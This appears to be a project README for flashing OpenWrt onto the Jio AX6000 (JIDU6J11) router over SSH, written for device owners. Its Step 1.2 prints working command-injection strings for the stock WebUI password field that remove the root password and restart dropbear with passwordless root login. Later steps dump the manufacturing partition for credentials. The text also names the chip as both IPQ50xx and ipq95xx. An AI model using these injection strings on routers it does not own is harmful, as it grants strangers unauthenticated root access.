# Jio AX6000 (JIDU6J11) — OpenWrt via SSH

> **Install OpenWrt on the Jio AX6000 (JIDU6J11 / Qualcomm IPQ50xx) — no UART, no screwdriver, 100% over SSH.**

![OpenWrt](https://img.shields.io/badge/OpenWrt-25.x-blue)
![Method](https://img.shields.io/badge/Method-SSH%20Only-green)
![Device](https://img.shields.io/badge/Device-Jio%20JIDU6J11-orange)
![License](https://img.shields.io/badge/License-GPL--3.0-blue)

> [!WARNING]
> **COPYRIGHT & PLAGIARISM NOTICE**  
> Scripts and flashing procedures published by the YouTube channel THE_DIY_DADDY (youtube.com/@the_diy_daddy) in archive 6j11_diy_daddy_autoflash.zip were copied, renamed, and redistributed from this repository without authorization. An official YouTube DMCA copyright complaint has been filed. The genuine, author-maintained open-source repository and firmware files are hosted exclusively here under the GNU General Public License v3.0.

---

## ⚠️ Disclaimer

> **This project is for EDUCATIONAL AND RESEARCH PURPOSES ONLY.**
>
> - This is intended for use **only on hardware that you personally own**.
> - Flashing custom firmware **will void your warranty** with Jio / Reliance.
> - After the final step (`sysupgrade`), **the stock Jio firmware is permanently overwritten** and cannot be restored.
> - There is a **risk of bricking** your device if the process is interrupted (e.g., power loss during flash).
> - The authors are **not responsible** for any damage, data loss, or bricked devices.
> - By using these tools, you accept **full responsibility** for any consequences.
>
> **See [DISCLAIMER.md](DISCLAIMER.md) for the full legal disclaimer.**

---

## Table of Contents

- [About](#about)
- [Firmware Variants: Standard vs Small Buffers](#firmware-variants-standard-vs-small-buffers)
- [What You Get](#what-you-get)
- [Prerequisites](#prerequisites)
- [Step 1: Enable SSH on Stock Firmware](#step-1-enable-ssh-on-stock-firmware)
- [Step 1.4: ⚠️ Recommended: Backup MFG Partition & Retrieve U-Boot Creds](#14-️-recommended-backup-mfg-partition--retrieve-u-boot-creds)
- [Method 1: One-Click Flasher (Beginners)](#method-1-one-click-flasher-beginners)
- [Method 2: Manual Flash (Advanced Users)](#method-2-manual-flash-advanced-users)
- [Post-Install](#post-install)
- [How It Works](#how-it-works)
- [FAQ](#faq)
- [Troubleshooting](#troubleshooting)
- [Building From Source](#building-from-source)
- [Credits & Acknowledgments](#credits--acknowledgments)
- [License](#license)

---

## About

The **Jio AX6000** (model **JIDU6J11**) is a Wi-Fi 6 router powered by a **Qualcomm IPQ50xx** SoC. It ships with a locked-down stock firmware from Jio/Reliance.

This project provides a **fully SSH-based method** to replace the stock firmware with [OpenWrt](https://openwrt.org/) — an open-source Linux distribution for embedded networking devices. **No need to open the router, no UART cables, no soldering.** Everything is done remotely over your network.

### How is SSH access obtained?

The stock Jio firmware has a **command injection vulnerability** in the WebUI's password change form. By entering specially crafted strings into the password fields, we can:
1. Remove the root password
2. Kill the running SSH daemon
3. Restart it with no-password authentication enabled

This gives us full root SSH access to the stock router, which we then use to flash OpenWrt.

---

## Firmware: Factory Image & Sysupgrade Variants

We provide firmware in the [**Releases**](../../releases) tab. You need **two files**:

1. **Factory Image** (same for everyone — boots a temporary OpenWrt from RAM):

   `openwrt-qualcommbe-ipq95xx-jiorouter_ax6000-jidu6j11-initramfs-factory.ubi`

2. **Sysupgrade Image** — choose ONE variant based on your needs:

| Variant | Sysupgrade Image (Permanent Flash) |
| :--- | :--- |
| **Standard (Recommended)** | `openwrt-qualcommbe-ipq95xx-jiorouter_ax6000-jidu6j11-squashfs-sysupgrade.bin` |
| **Small Buffers** | `openwrt-qualcommbe-ipq95xx-jiorouter_ax6000-jidu6j11-smallbuffers-squashfs-sysupgrade.bin` |

### 🔍 What is the difference?

* **Standard Build (Recommended for most users):**
  * Allocates larger networking ring buffers and socket packet buffers (skbuffs) in RAM.
  * **Best for:** Maximum routing performance and sustained high throughput on Gigabit WAN under heavy Wi-Fi 6 traffic.
  * **Trade-off:** Reserves slightly more RAM for packet buffers.

* **Small Buffers Build:**
  * Tunes network buffer pools to use smaller memory footprints.
  * **Best for:** Saving RAM (~15–30 MB more free memory) if you plan to run memory-intensive background services such as **AdGuard Home, Docker/LXC containers, Tailscale, or complex VPN servers**.
  * **Trade-off:** Under extreme 1 Gbps+ saturating traffic with high parallel connections, buffer depletion is theoretically possible compared to standard buffers.

> 💡 **Recommendation:** Unless you have a specific need to maximize free RAM for heavy applications, pick the **Standard** build.

---

## What You Get

After a successful install:

| Feature | Details |
| :--- | :--- |
| **OS** | OpenWrt (with LuCI WebUI) |
| **Usable Storage** | ~174 MB (for packages, configs, etc.) |
| **IP Address** | `192.168.1.1` |
| **WebUI** | `http://192.168.1.1` (LuCI) |
| **SSH** | `ssh root@192.168.1.1` |

---

## Prerequisites

### Hardware
- ✅ **Jio AX6000 router** (model JIDU6J11) on stock firmware
- ✅ **Ethernet cable** (to connect your PC directly to the router)
- ✅ **Windows PC** (for the automated 1-click batch script) or any PC with OpenSSH

### Software
- ✅ **OpenSSH** — Built into Windows 10/11. Verify by opening Command Prompt and typing:
  ```
  ssh -V
  ```
  You should see something like `OpenSSH_for_Windows_8.x`.

### Downloads
1. Go to the [**Releases**](../../releases) page.
2. Download:
   - `openwrt-qualcommbe-ipq95xx-jiorouter_ax6000-jidu6j11-initramfs-factory.ubi` (factory image — same for all variants)
   - **One** sysupgrade image (`*sysupgrade.bin` — Standard or Smallbuffers)
   - `flash.sh`
   - `Jio_6J11_OpenWrt_Flasher.bat`

---

## Step 1: Enable SSH on Stock Firmware

> **This step is required for both methods.** You only need to do this once.

The stock Jio router does not have SSH enabled by default. We exploit a command injection vulnerability in the WebUI to enable it.

### 1.1 Connect to the Router

1. Connect your PC to the router with an **Ethernet cable** (LAN port)
2. Open a browser and go to: **`http://192.168.31.1`**
3. Log in with the default credentials (printed on the router's sticker, or check your Jio app)

<!-- 📸 SCREENSHOT PLACEHOLDER:
     Place a screenshot of the Jio stock WebUI login page here.
     Save as: docs/images/webui-login.png
     Example: ![Stock WebUI Login](docs/images/webui-login.png)
-->

### 1.2 Inject Commands via Password Change

Navigate to the **password change** section in the WebUI settings.

Enter the following **three strings in sequence** in the password field, submitting each one:

---

**Password 1** — Removes the root password:
```
Aa1$(passwd${IFS}-d${IFS}root)
```

**Password 2** — Kills the existing SSH daemon:
```
Cc2$(killall${IFS}dropbear)
```

**Password 3** — Restarts SSH with no-authentication login:
```
Dd3$(dropbear${IFS}-B)
```

---

> **How do these work?** The `Aa1` / `Cc2` / `Dd3` prefixes satisfy the WebUI's password complexity rules. The `$(...)` part executes shell commands on the router. `${IFS}` is used instead of spaces because spaces are filtered by the form.

<!-- 📸 SCREENSHOT PLACEHOLDER:
     Place a screenshot showing the password change form with one of the commands entered.
     Save as: docs/images/webui-password-injection.png
     Example: ![Password Injection](docs/images/webui-password-injection.png)
-->

### 1.3 Verify SSH Access

Open **Command Prompt** (or PowerShell) on your PC and run:

```bash
ssh root@192.168.31.1
```

If prompted about the host key, type `yes`. You should get a root shell **with no password prompt**:

```
BusyBox v1.36.1 () built-in shell (ash)

root@OpenWrt:~#
```

Type `exit` to disconnect.

---

### 1.4 ⚠️ Recommended: Backup MFG Partition & Retrieve U-Boot Creds

The **`mfg` (manufacturing)** partition stores your device's unique factory metadata: **MAC address, serial number, default Wi-Fi keys, and U-Boot / UART login password**.

#### 1. Backup `mfg.bin` to your PC:

From your PC's Command Prompt or PowerShell (inside your flasher working directory), run:

```bash
ssh root@192.168.31.1 "cat /dev/\$(grep -i 'mfg' /proc/mtd | cut -d: -f1)ro > /tmp/mfg.bin 2>/dev/null || cat /dev/\$(grep -i 'mfg' /proc/mtd | cut -d: -f1) > /tmp/mfg.bin" && scp -O root@192.168.31.1:/tmp/mfg.bin .
```

This dumps the `mfg` partition and saves `mfg.bin` directly into your PC's folder.

#### 2. Read your U-Boot / UART credentials from `mfg.bin`:

You can view your device's login credentials using `strings` or PowerShell:

* **Using `strings` (Linux / WSL / Git Bash):**
  ```bash
  strings mfg.bin | grep -i -E "pass|pwd|uboot|jidu|user"
  ```

* **Using Windows PowerShell:**
  ```powershell
  Get-Content -Path .\mfg.bin -Raw | Select-String -Pattern "jidu", "pwd", "uboot", "pass"
  ```

* **Or open `mfg.bin`** directly in Notepad or any text editor.

> 💡 **Keep `mfg.bin` safe!** If you ever need to access the router's U-Boot console over UART, your login password is in this file.

---

## Method 1: One-Click Flasher (Beginners)

> **Recommended for first-time users.** The script auto-detects your downloaded firmware files.

### Steps:

1. **Make sure SSH is enabled** (complete [Step 1](#step-1-enable-ssh-on-stock-firmware) first).
2. **Place all files in the same folder** on your PC:
   ```
   📁 Flasher Folder
   ├── openwrt-qualcommbe-ipq95xx-jiorouter_ax6000-jidu6j11-initramfs-factory.ubi
   ├── openwrt-qualcommbe-...-sysupgrade.bin   (Standard or Smallbuffers)
   ├── flash.sh
   └── Jio_6J11_OpenWrt_Flasher.bat
   ```
3. **Double-click `Jio_6J11_OpenWrt_Flasher.bat`**.
4. The script will automatically:
   - ✅ Detect your factory and sysupgrade image filenames
   - ✅ Ping and connect to the stock router at `192.168.31.1`
   - ✅ Upload the files to `/tmp/`
   - ✅ Auto-detect active and idle NAND slots and flash OpenWrt to the idle slot
   - ✅ Configure U-Boot to boot the OpenWrt kernel
   - ✅ Reboot into temporary OpenWrt (90s timer)
   - ✅ Connect to OpenWrt at `192.168.1.1`
   - ✅ Upload and apply permanent sysupgrade
   - ✅ Reboot into permanent OpenWrt (90s timer)
5. When complete, access the OpenWrt LuCI WebUI at: **`http://192.168.1.1`**

<!-- 📸 SCREENSHOT PLACEHOLDER:
     Place a screenshot of the batch script running successfully.
     Save as: docs/images/bat-script-success.png
     Example: ![1-Click Flasher Success](docs/images/bat-script-success.png)
-->

---

## Method 2: Manual Flash (Advanced Users)

> For developers or users who want complete visibility into every command.

### 2.1 Upload Factory Image to Stock Router

```bash
# Clear any old SSH host keys
ssh-keygen -R 192.168.31.1

# Upload the factory UBI image and flash script
scp -O openwrt-qualcommbe-*-factory.ubi flash.sh root@192.168.31.1:/tmp/
```

### 2.2 Flash the Idle Slot

SSH into the stock router and execute `flash.sh`:

```bash
ssh root@192.168.31.1

# Sanitize line endings and execute
sed -i 's/\r$//' /tmp/flash.sh
sh /tmp/flash.sh
```

The script dynamically inspects `/proc/cmdline` and `/proc/mtd` to determine whether your unit is booted on `rootfs` or `rootfs_1`, formats the idle slot, configures U-Boot, and triggers reboot.

### 2.3 Wait for Reboot into Temporary OpenWrt

Wait **90 seconds**. The router reboots and boots into temporary OpenWrt at **`192.168.1.1`**.

Verify connection:
```bash
ping 192.168.1.1
```

### 2.4 Upload and Apply Permanent Sysupgrade

```bash
# Reset host key for 192.168.1.1
ssh-keygen -R 192.168.1.1

# Upload sysupgrade binary
scp -O openwrt-qualcommbe-*-sysupgrade.bin root@192.168.1.1:/tmp/sysupgrade.bin

# Apply sysupgrade
ssh root@192.168.1.1 "sysupgrade -v -n /tmp/sysupgrade.bin"
```

### 2.5 Wait for Final Reboot

Wait **90 seconds**. Both NAND slots are now permanently merged into OpenWrt. Access LuCI at: **`http://192.168.1.1`**.

---

## Post-Install

### Set a Root Password
Open `http://192.168.1.1` in your browser and set an admin password under **System → Administration**, or via SSH:
```bash
ssh root@192.168.1.1
passwd
```

### Disk Space Breakdown

```
Filesystem                Size      Used Available Use% Mounted on
/dev/ubi0_2             179.1M    268.0K    174.1M   0% /overlay
```

| Volume | Name | Size | Purpose |
| :--- | :--- | :--- | :--- |
| `ubi0_0` | `kernel` | 4.9 MiB | OpenWrt Linux Kernel |
| `ubi0_1` | `rootfs` | 11.5 MiB | Read-only squashfs system (`/rom`) |
| `ubi0_2` | `rootfs_data` | 195.9 MiB | Writable overlay (`/overlay` — ~174 MB usable) |
| `ubi0_127`| `provisioning`| 248.0 KiB | UBI Provisioning metadata |
| **Total** | `ubi0` | **217.9 MiB** | Both stock slots combined into one |

---

## How It Works

1. **Step 1 (Factory Flash):** Stock Jio uses dual-boot A/B slots (`rootfs` / `rootfs_1`). The script flashes the temporary OpenWrt initramfs to the **idle slot only**. Stock firmware is untouched at this point.
2. **Step 2 (Sysupgrade):** Permanent sysupgrade merges **both slots** into a single unified 225MB UBI partition (`0xe100000@0x1700000`). **Stock Jio firmware is permanently overwritten.**

> Detailed technical explanation: see **[docs/HOW_IT_WORKS.md](docs/HOW_IT_WORKS.md)**.

---

## FAQ

### Can I go back to stock Jio firmware?
**No.** After sysupgrade completes, the dual-boot partition layout is permanently replaced by a single unified OpenWrt partition. There is no stock recovery partition.

### Is this safe?
- Step 1 is very safe (flashes to idle slot; stock firmware remains intact).
- Step 2 writes the entire NAND area. **Do NOT power off or disconnect the router during sysupgrade.**

### Why does my unit show different MTD numbers?
Because Jio OTA updates toggle the active slot. Some units run on `mtd23`, others on `mtd24`. The scripts detect your active slot dynamically.

---

## Troubleshooting

See **[docs/TROUBLESHOOTING.md](docs/TROUBLESHOOTING.md)** for solutions to common questions and error messages.

---

## Building From Source

See **[docs/BUILDING_FIRMWARE.md](docs/BUILDING_FIRMWARE.md)** for compiling from OpenWrt `qualcommbe/ipq95xx`.

---

## Credits & Acknowledgments

- **[@Sandiep](https://github.com/Sandiep)** — **Special thanks and deep gratitude** to Sandiep for crafting and maintaining the custom OpenWrt builds for this hardware, providing invaluable technical guidance, device-tree insights, and continuous support throughout the research and testing of the Jio AX6000 (JIDU6J11). This project wouldn't have been possible without his dedication and expertise!
- **OpenWrt Project** — [openwrt.org](https://openwrt.org/) for the incredible open-source embedded router operating system.
- **Qualcomm IPQ50xx / IPQ95xx Linux Kernel & OpenWrt Contributors** for upstream hardware support.

---

## License

This project is licensed under the **GNU General Public License v3.0** — see [LICENSE](LICENSE) for details.
